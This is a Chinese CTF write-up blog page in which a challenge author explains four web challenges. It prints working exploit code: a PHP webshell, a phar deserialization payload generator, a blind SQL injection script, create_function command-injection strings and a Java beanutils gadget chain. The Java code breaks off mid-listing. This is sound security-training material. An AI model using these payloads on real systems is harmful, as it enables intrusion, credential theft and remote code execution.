@@ -1,0 +1,357 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <link rel="icon" href='https://static.dionysus.zip/static/favicon.ico' type="image/x-icon">
+    <title>Spirit-2023 - MoonlitSyntax</title>
+
+    <link rel="stylesheet" href='https://static.dionysus.zip/static/css/app-GERNH3ZV.css'>
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+
+<body class="l-body">
+
+<nav class="c-nav">
+    <a href="/" class="c-nav__link">首页</a>
+    <a href="/archives" class="c-nav__link">归档</a>
+    <a href="/tags" class="c-nav__link">标签</a>
+    <a href="/categories" class="c-nav__link">分类</a>
+    <a href="/links" class="c-nav__link">友链</a>
+    <a href="/about" class="c-nav__link">关于</a>
+    <button id="search-button" class="c-nav__search-btn">
+        <i class="fas fa-search"></i>
+    </button>
+</nav>
+
+
+<div class="l-container">
+    <div class="l-nav-spacer"></div>
+    <main class="l-main">
+        
+<div class="c-post">
+    <aside class="c-post__toc">
+        <h2 class="c-post__toc-title">目录</h2>
+        
+        <ol class="c-post__toc-list" id="toc-list"></ol>
+        
+    </aside>
+    <div class="c-post__main">
+        <header class="c-post__header">
+            <h1 class="c-post__title">Spirit-2023</h1>
+            <div class="c-post__meta">
+                <span class="c-post__meta-create"><i class="fas fa-calendar-plus"></i> 创建：2023-10-23 02:26</span>
+                <span class="c-post__meta-updated"><i class="fas fa-calendar-check"></i> 更新：2023-10-23 02:26</span>
+                <span class="c-post__meta-category"><i class="fas fa-folder-open"></i> 分类：<a href="/categories/CTF"><strong>CTF</strong></a></span>
+            </div>
+            <div class="c-post__tags">
+                <a href="/tags/Writeup" class="c-post__tag">#Writeup</a>
+            </div>
+            <div class="c-post__description">
+                校赛WP, 出了4道题
+            </div>
+        </header>
+
+        <article class="c-post__content prose"><blockquote>
+<p>记录一下自己出的题</p>
+</blockquote>
+<h2 id="rm-rf">rm -rf *</h2>
+<p>Linux下<code>rm -rf *</code>不会删除隐藏文件,所以写入隐藏文件<code>.1.php</code>就可以了
+所以直接写马,由于知道flag在根目录下,直接执行命令也行,接着访问<code>http://example.com/.1.php</code>就行了
+<code>&lt;?php system(&quot;cat /flag&quot;);?&gt;</code></p>
+<h2 id="sql-ser">sql-ser</h2>
+<p>sql注入加phar反序列化</p>
+<p>有一个读取文件的路由,读完之后发现是个反序列化题,但是没有<code>unserialize</code>,有上传图片功能.(看到这里大概就知道是个phar反序列化了)</p>
+<p>读取文件路由的<code>file_get_contents</code>限制了<code>html</code>目录,再加上严格的过滤,是不可能直接读取/flag,或者<code>phar://</code>协议读取文件的.</p>
+<p>另外几个可以触发的点在<code>upload.php</code>里的<code>file_exists</code>,<code>imgstatic.php</code>里的<code>md5_file</code>,上传文件的文件名是有过滤的,也不能<code>phar://</code></p>
+<p>那么利用点就在<code>md5_file</code>,访问403,但是被include,倒是问题不大,过滤也不严格,直接<code>phar://phar.jpg</code>就可以读取</p>
+<p>所以思路是:</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">sql注入获得admin密码获得admin身份=&gt;
+</span></span><span class="line"><span class="cl">构造恶意的phar文件并上传=&gt;
+</span></span><span class="line"><span class="cl">phar://phar.jpg=&gt;getshell
+</span></span></code></pre></div></div><p>然后链子很简单,但是有个小技巧,利用内置类Exception,同时修改hex数据里的数组指针,置空触发gc提前回收</p>
+<p>注意一下php配置里是否开启了phar文件的生成</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">php</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="php"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Spirit</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$webdog</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$dogweb</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$webweb</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">something</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;出题人讨厌php反序列化,所以他不打算让你构造复杂的链子&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$webweb</span> <span class="o">=</span><span class="s2">&#34;I_DONT_KNOW_HOW_TO_BYPASS_WAKEUP&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Flag</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$cmd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$spirit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">WAF</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;出题人讨厌WAF,所以他不打算给你WAF&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span> <span class="o">=</span> <span class="nv">$cmd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// function __destruct(){
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
+</span></span><span class="line"><span class="cl">    <span class="c1">//     if( ($this-&gt;spirit-&gt;webdog != $this-&gt;spirit-&gt;dogweb)&amp;&amp;(md5($this-&gt;spirit-&gt;webdog) === md5($this-&gt;spirit-&gt;dogweb)) &amp;&amp; (sha1($this-&gt;spirit-&gt;webdog) === sha1($this-&gt;spirit-&gt;dogweb))){
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//         system($this-&gt;cmd);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//     }
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// }
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="p">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Flag</span><span class="p">(</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="p">[]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">spirit</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Spirit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">spirit</span><span class="o">-&gt;</span><span class="na">webdog</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span><span class="nv">$a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">spirit</span><span class="o">-&gt;</span><span class="na">dogweb</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//这里要在同一行,大家可以自行试试
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;GIF89a&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;?php__HALT_COMPILER();?&#39;&gt;&#34;</span><span class="p">);</span><span class="c1">//添加图片头,有检测
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span><span class="c1">//将自定义meat-data存入manifest
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span><span class="s2">&#34;111&#34;</span><span class="p">);</span><span class="c1">//添加要压缩的文件,这里随意了
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div></div><p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250311023124.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250311023124.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">python</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="python"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha256</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/Users/dionysus/CTF/phar.phar&#34;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">   <span class="n">text</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">   <span class="n">main</span><span class="o">=</span><span class="n">text</span><span class="p">[:</span><span class="o">-</span><span class="mi">28</span><span class="p">]</span>        <span class="c1">#正文部分(除去最后28字节)</span>
+</span></span><span class="line"><span class="cl">   <span class="n">end</span><span class="o">=</span><span class="n">text</span><span class="p">[</span><span class="o">-</span><span class="mi">8</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">   <span class="n">new_sign</span><span class="o">=</span><span class="n">sha256</span><span class="p">(</span><span class="n">main</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">   <span class="n">new_phar</span><span class="o">=</span><span class="n">main</span><span class="o">+</span><span class="n">new_sign</span><span class="o">+</span><span class="n">end</span>
+</span></span><span class="line"><span class="cl">   <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/Users/dionysus/CTF/phar.phar&#34;</span><span class="p">,</span><span class="s1">&#39;wb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">new_phar</span><span class="p">)</span>     <span class="c1">#将新生成的内容以二进制方式覆盖写入原来的phar文件</span>
+</span></span></code></pre></div></div><p>最后修复签名,修改后缀上传</p>
+<p>getshell的逻辑部分讲完了,现在来讲讲前置sql注入,需要sql注入之后才能通过admin身份上传恶意的文件</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">python</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="python"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">=</span><span class="s2">&#34;.0123456789:abcdefghijklmnopqrstuvwxyz{|}~&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#其实只有小写字母和数字</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://127.0.0.1:9999/login.php&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">k</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">50</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">#print(i)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">data</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="s1">&#39;username1&#39;</span><span class="p">:</span><span class="s2">&#34;&#39; or 1 union select 1,2,&#39;</span><span class="si">{0}</span><span class="s2">&#39; order by 3#&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">k</span><span class="o">+</span><span class="n">j</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">		<span class="s1">&#39;pwd1&#39;</span><span class="p">:</span><span class="s1">&#39;1&#39;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">#print(r.text)</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">#print(data[&#39;username&#39;])</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">			<span class="n">k</span><span class="o">=</span><span class="n">k</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="nb">print</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">break</span>
+</span></span></code></pre></div></div><p>就是个order by盲注
+要注意的是不要创建账号,因为邪恶的出题人设置了某个密码zxxxxx,注册的密码如果在z之前,那么就永远不能靠order by盲注来得到密码了</p>
+<h2 id="hidden">hidden</h2>
+<blockquote>
+<p>php &lt;= 7.4.21 源码泄露漏洞</p>
+</blockquote>
+<p>就是<code>php -S</code>启动的服务,存在源码泄露问题</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250311023649.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250311023649.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><code>1.js</code>那个位置,随便写啦,但是不能是真实存在的文件,比如服务器上真的有的<code>index.php</code></p>
+<p>把自动补齐长度给关了,发包后得到源码</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">php</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="php"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;$name&#39;</span><span class="p">,</span><span class="s1">&#39;echo &#34;dionysus&#34;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">f</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="s2">&#34;dionysus&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div></div><p>在a处注入 <code>){}system(&quot;ls&quot;);/*</code> 然后对他进行对应的编码post传数据就是了
+如果是在b处注入的话就是<code>}system(&quot;ls&quot;);/*</code></p>
+<h2 id="cb_java">cb_java</h2>
+<blockquote>
+<p>signedobject打二次反序列化,由于不出网吗,需要反序列化注入内存马</p>
+</blockquote>
+<p>前面的随机数预测什么的就不说了,直接到反序列化部分</p>
+<p>首先是禁用类,cc依赖的都被ban了,<code>TemplatesImpl</code>也被ban,<code>resolveClass</code>通过 <strong>URLClassLoader.loadClass</strong> 进行加载类，这种类加载方式不支持加载数组,那么就打二次反序列化=&gt;<a href="https://tttang.com/archive/1701/">here</a></p>
+<p>反正也没什么人看( 直接把答案贴了</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">java</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="java"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">zip.dionysus</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.beanutils.BeanComparator</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.net.URLEncoder</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.security.KeyPair</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.security.KeyPairGenerator</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.security.Signature</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.security.SignedObject</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Arrays</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Field</span> <span class="nf">getField</span><span class="o">(</span><span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span><span class="o">,</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">field</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">field</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">(),</span> <span class="n">fieldName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">field</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">PriorityQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="nf">getpayload</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">,</span> <span class="n">String</span> <span class="n">string</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">BeanComparator</span> <span class="n">beanComparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BeanComparator</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">CASE_INSENSITIVE_ORDER</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">PriorityQueue</span> <span class="n">priorityQueue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="n">beanComparator</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">priorityQueue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">&#34;1&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">priorityQueue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">&#34;2&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">beanComparator</span><span class="o">,</span> <span class="s">&#34;property&#34;</span><span class="o">,</span> <span class="n">string</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">,</span> <span class="s">&#34;queue&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">object</span><span class="o">,</span> <span class="kc">null</span><span class="o">});</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">priorityQueue</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">getpayload2</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_bytecodes&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="n">EvilTemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">()).</span><span class="na">toBytecode</span><span class="o">()</span>
+</span></span><span class="line"><span class="cl">        <span class="o">});</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_name&#34;</span><span class="o">,</span> <span class="s">&#34;HelloTemplatesImpl&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">&#34;_tfactory&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="n">BeanComparator</span> <span class="n">comparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BeanComparator</span><span class="o">();</span>
